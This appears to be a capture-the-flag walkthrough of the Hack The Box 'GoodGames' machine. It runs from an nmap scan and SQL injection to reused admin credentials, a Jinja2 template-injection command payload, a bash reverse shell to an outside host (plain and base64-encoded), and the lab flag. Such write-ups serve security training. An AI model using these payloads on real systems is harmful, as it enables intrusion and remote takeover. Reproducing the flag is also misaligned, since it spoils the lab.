Nmap
```
└─$ nmap -sCV -p- 10.129.226.138                                                                                                                                                                                                    
Nmap scan report for 10.129.226.138 
Host is up (0.019s latency). 
Not shown: 65534 closed ports 
PORT   STATE SERVICE  VERSION 
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2 
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2 
|_http-title: GoodGames | Community and Store 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 441.90 second
```
Time based blind sql injection in sign in page

![image](https://user-images.githubusercontent.com/87831546/142666137-ceea7690-cae8-4822-bc26-9b876198f1cf.png)

Dump the users table and we find admin credentials
```
admin@goodgames.htb
superadministrator
```

Logging into admin account and clicking on the settings feature we find subdomain:
```
internal-administration
```
![image](https://user-images.githubusercontent.com/87831546/142666394-11ee96c4-64db-474f-84a0-b04c1596f3c0.png)

Add to /etc/hosts

![image](https://user-images.githubusercontent.com/87831546/142666449-b32e99e2-1e05-436b-80a5-0687144c6b03.png)

Login with 
```
admin@goodgames.htb
superadministrator
```
![image](https://user-images.githubusercontent.com/87831546/142666482-c888bc72-307e-45ac-a17e-272420a7c995.png)

Flask application and SSTI in the Full Name field
![image](https://user-images.githubusercontent.com/87831546/142666543-8ccb3f45-0888-4244-a549-2cfcd97ec2a0.png)

Command execution throuhg SSTI:
```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
```
Get reverse shell by base64 encoding bash reverse shell then piping to base64 decode and then piped to bash
```
bash -i >& /dev/tcp/10.10.14.42/4242 0>&1
```
```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Mi8xMjM0IDA+JjE= | base64 -d | bash').read() }}
```
```
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
````
